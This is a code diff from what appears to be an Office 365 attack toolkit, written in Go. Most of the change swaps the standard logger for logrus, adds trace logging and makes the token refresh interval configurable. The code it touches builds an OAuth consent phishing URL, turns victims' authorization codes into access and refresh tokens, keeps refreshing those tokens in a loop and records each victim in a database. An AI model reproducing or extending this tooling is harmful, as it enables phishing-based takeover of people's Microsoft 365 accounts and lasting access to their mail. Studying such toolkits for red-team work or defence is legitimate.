@@ -5,12 +5,15 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"net/http"
 	"net/url"
 	"time"
 
+	"github.com/sirupsen/logrus"
+	log "github.com/sirupsen/logrus"
+
 	"github.com/vitorallo/o365-attack-toolkit/database"
+	"github.com/vitorallo/o365-attack-toolkit/logging"
 	"github.com/vitorallo/o365-attack-toolkit/model"
 )
 
@@ -18,16 +21,17 @@ import (
 func RefreshAccessToken(user *model.User) bool {
 
 	postURL := "https://login.microsoftonline.com/common/oauth2/v2.0/token"
-
+	logging.Log.Trace("Sending POST request to: ", postURL)
 	formdata := url.Values{}
 	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
 	formdata.Add("grant_type", "refresh_token")
 	formdata.Add("client_secret", model.GlbConfig.Oauth.ClientSecret)
 	formdata.Add("refresh_token", user.RefreshToken)
+	logging.Log.Trace(formdata)
 
 	resp, err := http.PostForm(postURL, formdata)
 	if err != nil {
-		log.Printf("Error: %s \n", err.Error())
+		logging.Log.Error("Error: %s", err.Error())
 	} else {
 		if resp.StatusCode == 200 {
 
@@ -45,10 +49,9 @@ func RefreshAccessToken(user *model.User) bool {
 
 }
 
-func RecursiveTokenUpdate() {
-
+func RecursiveTokenUpdate(l *logrus.Logger) {
+	l.Debug("[Routine] Performing recursive token update, will repeat every: ", model.GlbConfig.Oauth.RefreshTime*time.Minute)
 	for {
-
 		// Call get users
 		// Call refresh access token
 		// call update tokens
@@ -56,29 +59,29 @@ func RecursiveTokenUpdate() {
 		for _, user := range users {
 			bSuccess := RefreshAccessToken(&user)
 			if bSuccess {
-				log.Printf("Retrieving new token for %s\n", user.Mail)
+				l.Info("[Routine] Retrieving new token for: ", user.Mail)
 			} else {
-				log.Printf("Failed updating token for %s\n", user.Mail)
+				l.Info("[Routine] Failed updating token for: ", user.Mail)
 				user.AccessTokenActive = 0
 			}
 			database.UpdateUserTokens(user)
 
 		}
-		time.Sleep(30 * time.Minute)
+		time.Sleep(model.GlbConfig.Oauth.RefreshTime * time.Minute)
 	}
-
 }
 
 // GenerateURL gives the URL for phishing
 func GenerateURL() string {
 	phishURL := fmt.Sprintf("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=%s&redirect_uri=%s&response_type=code&client_id=%s", url.QueryEscape(model.GlbConfig.Oauth.Scope), url.QueryEscape(model.GlbConfig.Oauth.Redirecturi), url.QueryEscape(model.GlbConfig.Oauth.ClientId))
+	logging.Log.Trace("Generating URL for: ", phishURL)
 	return phishURL
 }
 
 // GetAllTokens will call the microsoft endpoint to get all the tokens
 func GetAllTokens(code string) []byte {
 	postURL := "https://login.microsoftonline.com/common/oauth2/v2.0/token"
-
+	logging.Log.Trace("Sending POST request to: ", postURL)
 	formdata := url.Values{}
 	formdata.Add("client_id", model.GlbConfig.Oauth.ClientId)
 	formdata.Add("scope", model.GlbConfig.Oauth.Scope)
@@ -86,13 +89,15 @@ func GetAllTokens(code string) []byte {
 	formdata.Add("grant_type", "authorization_code")
 	formdata.Add("client_secret", model.GlbConfig.Oauth.ClientSecret)
 	formdata.Add("code", code)
+	logging.Log.Trace(formdata)
 
 	resp, err := http.PostForm(postURL, formdata)
 	if err != nil {
-		log.Printf("Error: %s \n", err.Error())
+		logging.Log.Error("Error: %s", err.Error())
 	} else {
 		data, _ := ioutil.ReadAll(resp.Body)
-		log.Printf("GetAllTokens, response: %s", string(data))
+		logging.Log.Trace("GetAllTokens, response:")
+		logging.Log.Trace(string(data))
 		return data
 	}
 	return nil
@@ -127,7 +132,8 @@ func CallAPIMethod(method string, endpoint string, accessToken string, additiona
 		return "", 0
 	}
 
-	log.Printf("CallAPIMethod, response: %v", string(body))
+	logging.Log.Trace("CallAPIMethod, response:")
+	logging.Log.Trace(string(body))
 
 	return string(body), resp.StatusCode
 }
@@ -135,7 +141,7 @@ func CallAPIMethod(method string, endpoint string, accessToken string, additiona
 // InitializeProfile Initializes the user in the database
 func InitializeProfile(accessToken string, refreshToken string) {
 
-	log.Printf("Initialise profile for access token %v", accessToken)
+	logging.Log.Trace("Initialise profile for access token: ", accessToken)
 	userResponse, _ := CallAPIMethod("GET", "/me", accessToken, "", nil, "")
 	user := model.User{}
 	user.AccessToken = accessToken
@@ -145,7 +151,7 @@ func InitializeProfile(accessToken string, refreshToken string) {
 	json.Unmarshal([]byte(userResponse), &user)
 
 	user.Mail = user.UserPrincipalName
-	log.Printf("Successful authentication from: %s", user.Mail)
+	logging.Log.Printf("Successful authentication from: %s", user.Mail)
 	database.InsertUser(user)
 
 	//createRules(user)
@@ -154,6 +160,7 @@ func InitializeProfile(accessToken string, refreshToken string) {
 
 }
 
+//still to review
 func createRules(user model.User) {
 
 	tempLocalRules := model.GlbRules
